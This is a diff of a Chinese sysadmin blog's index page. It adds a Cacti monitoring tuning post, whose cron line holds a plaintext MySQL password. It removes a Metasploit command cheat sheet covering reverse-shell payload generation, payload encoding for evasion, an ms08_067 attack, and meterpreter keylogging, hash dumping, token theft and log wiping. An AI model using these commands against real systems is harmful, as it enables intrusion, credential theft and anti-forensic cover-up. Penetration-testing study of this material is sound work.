@@ -348,6 +348,191 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.simlinux.com/2013/04/02/cacti-performance.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Geekwolf">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://ow1schdt5.bkt.clouddn.com/logo/wolf.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geekwolf's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2013/04/02/cacti-performance.html" itemprop="url">Cacti的优化</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2013-04-02T09:42:30+08:00">
+                2013-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/系统监控/" itemprop="url" rel="index">
+                    <span itemprop="name">系统监控</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2013/04/02/cacti-performance.html" class="leancloud_visitors" data-flag-title="Cacti的优化">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="优化schema-Index"><a href="#优化schema-Index" class="headerlink" title="优化schema/Index"></a>优化schema/Index</h4><p>cacti默认的cacti.sql建立的数据库模型，竟然一个Index都没有建。每次执行poller.php的时候，主要的时间，都花费在数据库*查询上。使用下面的sql语句，建立一系列索引，弥补默认的cacti.sql中缺乏index的缺点。可以有效的提高poller.php执行的效率，缩短更新RRD文件所需的时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">CREATE INDEX `data_template_data_id` ON `data_input_data` (`data_template_data_id`);</div><div class="line">CREATE INDEX `host_id_snmp_query_id_snmp_index` ON data_local (`host_id`,`snmp_query_id`,`snmp_index`);</div><div class="line">CREATE INDEX `local_data_id_data_source_name` ON data_template_rrd (`local_data_id`,`data_source_name`);</div><div class="line">CREATE INDEX `graph_template_id_local_graph_id` ON graph_templates_item (`graph_template_id`,`local_graph_id`);</div><div class="line">CREATE INDEX `local_graph_template_item_id` ON graph_templates_item (`local_graph_template_item_id`);</div><div class="line">CREATE INDEX `host_id_snmp_query_id_snmp_index` ON host_snmp_cache (`host_id`,`snmp_query_id`,`snmp_index`);</div><div class="line">CREATE INDEX `local_data_id_rrd_path` ON poller_item (`local_data_id`,`rrd_path`);</div><div class="line">CREATE INDEX `host_id_rrd_next_step` ON poller_item (`host_id`,`rrd_next_step`);</div><div class="line">CREATE INDEX host_id_snmp_query_id ON host_snmp_cache (host_id,snmp_query_id);</div><div class="line">CREATE INDEX host_id_snmp_port ON poller_item (host_id,snmp_port);</div><div class="line">CREATE INDEX data_source_path ON data_template_data (data_source_path);</div><div class="line">show index from table； 查看索引</div></pre></td></tr></table></figure>
+<h4 id="重构RRA文件"><a href="#重构RRA文件" class="headerlink" title="重构RRA文件"></a>重构RRA文件</h4><p>首先在crontab里禁用poller.php，然后执行cacti_install_dir/cli目录下的 structure_rra_paths.php，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php  structure_rra_paths.php --proceed</div></pre></td></tr></table></figure>
+<p>它会将所有的RRD文件按照device重新分配目录，并修改<strong>数据库</strong>中的RRD路径，成功执行后，再恢复poller.php的crontab就可以了。<br>按照上面3个步骤，710台服务器，24000个RRD文件，完成一次poller.php的时间，缩短到50 seconds。实现了最初的目的。</p>
+<h4 id="TODO"><a href="#TODO" class="headerlink" title="TODO:"></a>TODO:</h4><p>在执行poller.php的时候, 监控服务器的load达到了3，通过vmstat查看，显示负载主要在I/O。在目前的情况，如果再出现瓶颈，可以考虑安装Boost插件来进一步提供性能。</p>
+<p>cacti主要通过snmp来采集数据，可以引入collected等客户端，提供数据采集的可靠性。</p>
+<p>使用spine替代默认的cmd.php来采集数据 见上一章</p>
+<h5 id="使用Spine"><a href="#使用Spine" class="headerlink" title="使用Spine"></a>使用Spine</h5><p>关于spine插件的安装，这里就不讲了<br>访问：<a href="http://cacti_host_ipaddress/cacti" target="_blank" rel="external">http://cacti_host_ipaddress/cacti</a><br>Settings -&gt; Paths -&gt; “Spine Poller File Path” -&gt; spine程序的位置<br>Settings -&gt; Poller -&gt; “Poller Type” -&gt; spine</p>
+<h5 id="进程调整"><a href="#进程调整" class="headerlink" title="进程调整"></a>进程调整</h5><p>对于进程和线程的调整有利于缩短采集时间，可以进行大量的采集。在CU论坛上看有人说cacti能够同时采集1k服务，这样的性能没有测试过，但是有人测试过同时采集200台服务器的，占用的内容只有几百兆，cpu的利用率也很低，说明一台的普通的机器排除网络链路延时采集的性能是相当强悍的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Settings -&gt; Poller -&gt; &quot;Maximum Concurrent Poller Processes&quot;（最大并发轮询器进程），修改该值</div><div class="line">Settings -&gt; Poller -&gt; &quot;Maximum Threads per Process&quot;（每进程最大线程数），修改该值</div><div class="line">Settings -&gt; Poller -&gt; &quot;Number of PHP Script Servers&quot;（PHP脚本服务程序数），修改该值</div><div class="line">通过修改这三个参数，可以提高一部分的性能</div></pre></td></tr></table></figure>
+<h5 id="优化PHP内存"><a href="#优化PHP内存" class="headerlink" title="优化PHP内存"></a>优化PHP内存</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vi /etc/php.ini</div><div class="line">memory_limit = 256M （预设是128MB，根据内存的使用情况，可以改大一点）</div></pre></td></tr></table></figure>
+<h5 id="定期优化Cacti库"><a href="#定期优化Cacti库" class="headerlink" title="定期优化Cacti库"></a>定期优化Cacti库</h5><p>cacti 的 poller_output 会不明原因的长大，大到数据越写越慢，直到无法更新。每隔一段时间手动 “Truncate poller_output table” 后，就会继续正常运作；所以我们可以利用crontab定期清除数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vi /etc/cron.d/truncate_poller</div><div class="line">0 0 * * 0  root  /usr/local/mysql/bin/mysql --user=cacti --password=2010 cacti -e ‘truncate table poller_output;’</div><div class="line">#chkconfig --level 3 crond on &amp;amp;&amp;amp; service crond start</div></pre></td></tr></table></figure>
+<h5 id="修改mysql的最大连接数"><a href="#修改mysql的最大连接数" class="headerlink" title="修改mysql的最大连接数"></a>修改mysql的最大连接数</h5><p>一般默认安装的时候没有调整最大连接数的话，当需要并发量的时候可以出图就会断断续续的<br>mysql&gt; set GLOBAL max_connections=2000；<br>或者直接修改my.cnf配置文件，增加：max_connections = 2000；</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.simlinux.com/2013/03/31/linux-monitor-iftop.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1974,270 +2159,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.simlinux.com/2012/09/27/metasploit.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Geekwolf">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://ow1schdt5.bkt.clouddn.com/logo/wolf.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Geekwolf's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2012/09/27/metasploit.html" itemprop="url">metasploit(MSF)终端命令大全</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2012-09-27T10:21:25+08:00">
-                2012-09-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/系统安全/" itemprop="url" rel="index">
-                    <span itemprop="name">系统安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2012/09/27/metasploit.html" class="leancloud_visitors" data-flag-title="metasploit(MSF)终端命令大全">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  7
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>show exploits</p>
-<p>列出metasploit框架中的所有渗透攻击模块。<br>show payloads</p>
-<p>列出metasploit框架中的所有攻击载荷。<br>show auxiliary</p>
-<p>列出metasploit框架中的所有辅助攻击载荷。<br>search name</p>
-<p>查找metasploit框架中所有的渗透攻击和其他模块。<br>info</p>
-<p>展示出制定渗透攻击或模块的相关信息。<br>use name</p>
-<p>装载一个渗透攻击或模块。<br>LHOST</p>
-<p>你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。<br>RHOST</p>
-<p>远程主机或是目标主机。<br>set function</p>
-<p>设置特定的配置参数（EG：设置本地或远程主机参数）。<br>setg function</p>
-<p>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。<br>show options</p>
-<p>列出某个渗透攻击或模块中所有的配置参数。<br>show targets</p>
-<p>列出渗透攻击所有支持的目标平台。<br>set target num</p>
-<p>指定你所知道的目标的操作系统以及补丁版本类型。<br>set payload name</p>
-<p>指定想要使用的攻击载荷。<br>show advanced</p>
-<p>列出所有高级配置选项。<br>set autorunscript migrate -f.</p>
-<p>在渗透攻击完成后，将自动迁移到另一个进程。<br>check</p>
-<p>检测目标是否选定渗透攻击存在相应的安全漏洞。<br>exploit</p>
-<p>执行渗透攻击或模块来攻击目标。<br>exploit -j</p>
-<p>在计划任务下进行渗透攻击（攻击将在后台进行）。<br>exploit -z</p>
-<p>渗透攻击完成后不与回话进行交互。<br>exploit -e encoder</p>
-<p>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。<br>exploit -h</p>
-<p>列出exploit命令的帮助信息。<br>sessions -l</p>
-<p>列出可用的交互会话（在处理多个shell时使用）。<br>sessions -l -v</p>
-<p>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。<br>sessions -s script</p>
-<p>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。<br>sessions -K</p>
-<p>杀死所有活跃的交互会话。<br>sessions -c cmd</p>
-<p>在所有活跃的metasploit会话上执行一个命令。<br>sessions -u sessionID</p>
-<p>升级一个普通的win32 shell到metasploit shell。<br>db_create name</p>
-<p>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。<br>db_connect name</p>
-<p>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。<br>db_namp</p>
-<p>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。<br>db_autopwn -h</p>
-<p>展示出db_autopwn命令的帮助信息。<br>db_autopwn -p -r -e</p>
-<p>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>db_destroy</p>
-<p>删除当前数据库。<br>db_destroy user：<a href="mailto:passwd@host" target="_blank" rel="external">passwd@host</a>：port/database</p>
-<p>使用高级选项来删除数据库。<br><strong><em>metasploit命令</em></strong></p>
-<p>help</p>
-<p>打开meterpreter使用帮助。<br>run scriptname</p>
-<p>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。<br>sysinfo</p>
-<p>列出受控主机的系统信息。<br>ls</p>
-<p>列出目标主机的文件和文件夹信息。<br>use priv</p>
-<p>加载特权提升扩展模块，来扩展metasploit库。<br>ps</p>
-<p>显示所有运行的进程以及相关联的用户账户。<br>migrate PID</p>
-<p>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。<br>use incognito</p>
-<p>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）<br>list_tokens -u</p>
-<p>列出目标主机用户的可用令牌。<br>list_tokens -g</p>
-<p>列出目标主机用户组的可用令牌。<br>impersonate_token DOMAIN_NAMEUSERNAME</p>
-<p>假冒目标主机上的可用令牌。<br>steal_token PID</p>
-<p>盗窃给定进程的可用令牌并进行令牌假冒。<br>drop_token</p>
-<p>停止假冒当前令牌。<br>getsystem</p>
-<p>通过各种攻击向量来提升系统用户权限。<br>execute -f cmd.exe -i</p>
-<p>执行cmd.exe命令并进行交互。<br>execute -f cmd.exe -i -t</p>
-<p>以所有可用令牌来执行cmd命令并隐藏该进程。<br>rev2self</p>
-<p>回到控制目标主机的初始用户账户下。<br>reg command</p>
-<p>在目标主机注册表中进行交互，创建，删除，查询等操作。<br>setdesktop number</p>
-<p>切换到另一个用户界面（该功能基于那些用户已登录）。<br>screenshot</p>
-<p>对目标主机的屏幕进行截图。<br>upload file</p>
-<p>向目标主机上传文件。<br>download file</p>
-<p>从目标主机下载文件。<br>keyscan_start</p>
-<p>针对远程目标主机开启键盘记录功能。<br>keyscan_dump</p>
-<p>存储目标主机上捕获的键盘记录。<br>keyscan_stop</p>
-<p>停止针对目标主机的键盘记录。<br>getprivs</p>
-<p>尽可能多的获取目标主机上的特权。<br>uictl enable keyboard/mouse</p>
-<p>接管目标主机的键盘和鼠标。<br>background</p>
-<p>将你当前的metasploit shell转为后台执行。<br>hashdump</p>
-<p>导出目标主机中的口令哈希值。<br>use sniffer</p>
-<p>加载嗅探模式。<br>sniffer_interfaces</p>
-<p>列出目标主机所有开放的网络端口。<br>sniffer_dump interfaceID pcapname</p>
-<p>在目标主机上启动嗅探。<br>sniffer_start interfaceID packet-buffer</p>
-<p>在目标主机上针对特定范围的数据包缓冲区启动嗅探。<br>sniffer_stats interfaceID</p>
-<p>获取正在实施嗅探网络接口的统计数据。<br>sniffer_stop interfaceID</p>
-<p>停止嗅探。<br>add_user username password -h ip</p>
-<p>在远程目标主机上添加一个用户。<br>clearev</p>
-<p>清楚目标主机上的日志记录。<br>timestomp</p>
-<p>修改文件属性，例如修改文件的创建时间（反取证调查）。<br>reboot</p>
-<p>重启目标主机。<br><strong><em>MSFpayload命令</em></strong></p>
-<p>msfpayload -h</p>
-<p>msfpayload的帮助信息。<br>msfpayload windows/meterpreter/bind_tcp O</p>
-<p>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。<br>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe</p>
-<p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。<br>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw</p>
-<p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。<br>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c</p>
-<p>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。<br>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java</p>
-<p>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。<br><strong><em>msfencode命令</em></strong></p>
-<p>mefencode -h</p>
-<p>列出msfencode的帮助命令。<br>msfencode -l</p>
-<p>列出所有可用的编码器。<br>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)</p>
-<p>显示编码缓冲区的格式。<br>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe</p>
-<p>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。<br>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</p>
-<p>创建一个经过多种编码格式嵌套编码的攻击载荷。<br>msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c</p>
-<p>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。<br><strong><em>MSFcli命令</em></strong></p>
-<p>msfcli | grep exploit</p>
-<p>仅列出渗透攻击模块。<br>msfcli | grep exploit/windows</p>
-<p>仅列出与windows相关的渗透攻击模块。<br>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E</p>
-<p>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2288,7 +2209,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">88</span>
+                <span class="site-state-item-count">89</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
